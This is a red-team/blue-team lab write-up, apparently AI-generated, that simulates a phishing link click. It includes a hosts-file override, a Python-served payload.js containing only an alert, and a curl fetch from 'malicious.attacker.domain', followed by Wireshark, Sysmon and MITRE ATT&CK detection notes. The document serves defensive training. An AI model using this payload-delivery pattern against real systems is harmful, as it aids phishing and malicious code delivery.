# 🕵️ Scenario 9 — Phishing Link Resolution and Callback

## 🔴 Red Team Action
**Objective:** Simulate a phishing email link click that triggers DNS resolution and payload callback.

### ⚖️ Steps:
1. **Create a fake domain entry on the victim machine**:
   ```txt
   192.168.2.131 malicious.attacker.domain
   ```
   Edit the file `C:\Windows\System32\drivers\etc\hosts` as Administrator and append the above line. Confirm with:
   ```powershell
   ipconfig /flushdns
   ping malicious.attacker.domain
   ```

2. **Host a payload on the attacker (Kali) machine**:
   ```bash
   echo 'alert("Payload loaded!");' > payload.js
   sudo python3 -m http.server 80
   ```

3. **Simulate the phishing link click from the victim**:
   ```powershell
   curl http://malicious.attacker.domain/payload.js
   ```

4. **Packet captured (via Wireshark)**:
   - Shows HTTP request to `malicious.attacker.domain`
   - Confirms payload delivered over port 80

---

## 🔵 Blue Team Detection

### 🔍 Wireshark Filter:
```wireshark
(http.request or tls.handshake.type==1) and !(ssdp)
```

### 📉 Sample Capture Output:
- Victim IP: `192.168.2.129`
- Attacker IP: `192.168.2.131`
- Highlighted line shows:
  ```
GET /payload.js HTTP/1.1
Host: malicious.attacker.domain
  ```
- Status: `HTTP/1.0 200 OK`

Captured visual:
![Wireshark Capture](../images/wireshark_scenario9.png)

---

## 🔢 Sysmon Logs

If Sysmon is configured with DNS query monitoring:
- **Event ID 22**: DNS query for `malicious.attacker.domain`
- **Event ID 1**: `curl.exe` execution

---

## 🔮 MITRE ATT&CK Mapping

| Tactic         | Technique                    | Description                        |
|----------------|-------------------------------|------------------------------------|
| Initial Access | T1566 - Phishing              | Victim clicks link from phishing  |
| Recon/Callback | T1598 - Phishing for Information | DNS resolution + payload request |

---

## 📄 Screenshots

### ✅ Successful Payload Fetch:
![curl success](../images/curl_payload_success.png)

### 👁‍🗨️ HTTP Headers in Wireshark:
![http headers](../images/http_payload_headers.png)

### 🌐 Host Entry on Victim:
![hosts file](../images/hosts_file_entry.png)

---

## 🌎 Threat Emulation Summary
| Step                         | Status |
|------------------------------|--------|
| Hosts file DNS override      | ✅     |
| HTTP server active on Kali   | ✅     |
| Victim curl request succeeds | ✅     |
| Wireshark captures traffic   | ✅     |
| MITRE ATT&CK mapped          | ✅     |

---

## 🔨 Optional Enhancements
- Add a fake phishing email `.eml` file with a link to `http://malicious.attacker.domain/payload.js`
- Capture and label `.pcap` for Blue Team training
- Use `dnsmasq` for DNS-based resolution instead of `hosts` file for added realism

---

Let me know if you'd like:
- Markdown export with local image references
- PDF version with embedded screenshots
- GitHub folder structure with payloads, captures, and README

